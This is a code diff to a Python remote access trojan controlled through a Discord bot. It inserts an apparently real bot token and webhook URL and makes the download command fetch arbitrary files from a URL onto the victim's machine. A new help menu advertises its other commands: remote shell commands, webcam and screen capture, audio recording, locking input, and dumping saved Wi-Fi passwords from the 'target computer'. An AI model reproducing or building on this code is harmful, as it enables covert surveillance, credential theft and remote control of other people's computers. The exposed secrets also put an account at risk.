@@ -14,8 +14,8 @@ import sounddevice as sd
 from scipy.io.wavfile import write
 
 
-TOKEN = ""
-WEBHOOK_URL = ""
+TOKEN = "MTE5NTMzMTE1NzEwNjEwMjMzNA.GvXOK5.h4fkEprYwuWlB6BfuyremN04aJAoollnT-rwtY"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1195633509755265055/PkPWgyJEy9nRZrxcWTMwR88AWjf6X9WoOzo1FC5kSevKrJtMWbOrsZDAA_qWCH79x0dF"
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -158,12 +158,14 @@ async def on_message(message):
     elif message.content.startswith('download'):
         command = message.content
         command = command.replace('download ', '')
+        command = command.split()
+        url  = command[0]
+        file_name = command[1]
         webhook = DiscordWebhook(url=WEBHOOK_URL, content="Downloading!")
         response = webhook.execute()
     
-        url = command
         r = requests.get(url, allow_redirects=True)
-        open('d.d', 'wb').write(r.content)
+        open(file_name, 'wb').write(r.content)
         
 
     elif message.content.startswith('sys'):
@@ -229,6 +231,22 @@ async def on_message(message):
             webhook.add_file(file=rec.read(), filename="recording.wav")
         response = webhook.execute()
         os.remove("./recording.wav")
+    
+    
+    elif message.content.startswith("help"):
+        embed=discord.Embed(title="Here are my Commands!", description="nodes online", color=0x05e6e2)
+        embed.add_field(name="command <command>", value="send a command with output", inline=False)
+        embed.add_field(name="com <command>", value="send a command without output", inline=False)
+        embed.add_field(name="cam", value="take a picture", inline=False)
+        embed.add_field(name="lock <time>", value="locks the user's keyboard and mouse for the specified amount of time", inline=False)
+        embed.add_field(name="screenshot", value="sends you a screenshot of the target computer", inline=False)
+        embed.add_field(name="wifi", value="gives you a list of all saved wifi password on the target device", inline=False)
+        embed.add_field(name="download <url> <file_name>", value="downloads the file at the url", inline=False)
+        embed.add_field(name="sys", value="gives you the specs of the target computer", inline=False)
+        embed.add_field(name="play <url> <time_to_close_player>", value="self explainatory", inline=False)
+        embed.add_field(name="web <url>", value="opens the url in the browser", inline=False)
+        embed.add_field(name="record <time>", value="records an audio file on the target computer and sends it to you", inline=False)
+        await message.channel.send(embed=embed)
 
         
 client.run(TOKEN)
